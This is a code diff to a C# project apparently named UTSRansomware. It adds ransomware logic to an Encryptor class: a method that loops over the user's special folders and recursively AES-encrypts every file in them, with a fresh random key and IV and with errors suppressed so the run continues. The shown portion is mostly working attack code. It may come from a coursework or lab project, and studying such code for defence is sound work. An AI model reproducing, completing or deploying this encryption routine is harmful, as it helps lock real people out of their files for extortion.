@@ -10,31 +10,55 @@ namespace UTSRansomware
 {
     public class Encryptor
     {
+
         public byte[] key;
         public byte[] iv;
 
+        // Constructor to generate new key and IV
         public Encryptor()
         {
             this.key = GenerateKey();
             this.iv = GenerateIV();
         }
 
-        public void EncryptDirectory(string parentDirectory)
+        // Loops over special directories and encrypts all files in them
+        public void EncryptSpecialDirectories()
         {
-            string[] filePaths = Directory.GetFiles(parentDirectory);
-            string[] directoryPaths = Directory.GetDirectories(parentDirectory);
-
-            foreach (string directoryPath in directoryPaths)
+            foreach (Environment.SpecialFolder folder in Utils.specialFolders) 
             {
-                EncryptDirectory(directoryPath);
-            }
-
-            foreach (string filePath in filePaths)
-            {
-                EncryptFile(filePath);
+                string folderPath = Environment.GetFolderPath(folder);
+                if (Directory.Exists(folderPath))
+                {
+                    EncryptDirectory(folderPath);
+                }
             }
         }
 
+        // Encrypts all files in a directory, recursviely calls istelf to encrypt files in sub directories
+        public void EncryptDirectory(string parentDirectory)
+        {
+            try
+            {
+                string[] filePaths = Directory.GetFiles(parentDirectory);
+                string[] directoryPaths = Directory.GetDirectories(parentDirectory);
+
+                foreach (string directoryPath in directoryPaths)
+                {
+                    EncryptDirectory(directoryPath);
+                }
+
+                foreach (string filePath in filePaths)
+                {
+                    EncryptFile(filePath);
+                }
+            } catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+
+        }
+
+        // Encrypts a file
         public void EncryptFile(string filePath)
         {
             using (Aes aesAlg = Aes.Create())
@@ -65,7 +89,7 @@ namespace UTSRansomware
             }
         }
 
-
+        // Generates a random key
         private static byte[] GenerateKey()
         {
             using (Aes aes = Aes.Create())
@@ -78,6 +102,7 @@ namespace UTSRansomware
             }
         }
 
+        // Generates a random IV
         private static byte[] GenerateIV()
         {
             using (Aes aes = Aes.Create())
